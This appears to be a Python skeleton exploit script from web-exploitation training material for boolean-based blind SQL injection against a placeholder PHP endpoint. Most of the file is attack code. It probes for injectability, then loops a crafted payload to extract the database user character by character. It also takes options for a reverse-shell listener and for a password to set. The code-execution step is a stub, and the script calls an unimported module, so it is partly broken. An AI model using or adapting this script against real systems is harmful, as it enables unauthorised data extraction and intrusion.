#!/usr/bin/python3


import argparse
import requests
import sys


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Advanced Web Attacks and Exploitation')
        print('    >> Boolean-Based Blind SQLi Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


def send_get(url, debug):
    try:
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
            r = requests.get(url, proxies = proxies)
        else:
            r = requests.get(url)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r


def blind_inject(inj_str):
    for j in range(32, 126): # printable ascii range
        # now we update the payload with the character we are testing for
        inj_str_ = inj_str.replace("[CHAR]", str(j))
        target = f"http://{args.target}/path/to/inject.php?q={inj_str_}"
        r = send_get(target, args.debug)
        # below is the condition to ascertain whether the injection result is true or false
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy', action='store_true', required=False)
    global args
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.debug:
        for k,v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")

    # Validation
    r = send_get(f"http://{args.target}/path/to/inject.php?q='", args.debug)
    if re.search("<NEEDLE>", r.text): # vulnerable identifier condition
        output.success("Target is injectable!")
    else:
        output.warning("No SQLi detected.") 
        sys.exit(-1)

    user = ""
    output.info("Extracting current user")
    
    # Example extracting DB user
    for i in range(1, 17): # assuming user is no more than 16 chars
        injection_string = f"test')/**/or/**/(ascii(substring((select/**/user()),{i},1)))=[CHAR]%23"
        extracted_char = blind_inject(injection_string)
        if extracted_char == 64: # stop extracting when we hit the @ char as we don't want the host
            output.success("\nCurrent user extraction complete.")
            break
        else:
            extracted_char = chr(extracted_char)
            user = user + extracted_char
            sys.stdout.write(extracted_char)
            sys.stdout.flush()

    # Remote Code Execution
    send_get(f"http://{args.target}", args.debug)
    
    # Try Harder
    output.success('Exploit has been successfully executed. :eyes: on your listener!')
    
if __name__ == '__main__':
    main()
